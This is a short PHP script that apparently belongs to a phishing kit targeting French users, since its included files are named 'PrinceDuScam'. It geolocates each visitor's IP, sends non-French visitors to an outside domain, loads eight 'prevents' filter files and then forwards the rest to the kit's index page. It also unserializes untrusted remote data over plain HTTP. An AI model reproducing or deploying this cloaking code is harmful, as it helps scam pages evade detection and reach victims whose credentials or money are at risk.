<?php
$zbii = $_SERVER['REMOTE_ADDR'];
$geoip = 'http://www.geoplugin.net/php.gp?ip='.$zbii;
$addrDetailsArr = unserialize(file_get_contents($geoip)); 
$country = $addrDetailsArr['geoplugin_countryName'];
if (!$country)
{
    $country='Not found!';
}
if (strcmp($country, 'France')!==0)
{
      header("location: http://guiminer.co.technology/rd/ ");
     exit();
} 
  	include '../../prevents/PrinceDuScam1.php';
    include '../../prevents/PrinceDuScam2.php';
    include '../../prevents/PrinceDuScam3.php';
    include '../../prevents/PrinceDuScam4.php';
    include '../../prevents/PrinceDuScam5.php';
    include '../../prevents/PrinceDuScam6.php';
    include '../../prevents/PrinceDuScam7.php';
    include '../../prevents/PrinceDuScam8.php';
	exit(header("Location: ../index.php"));
?>
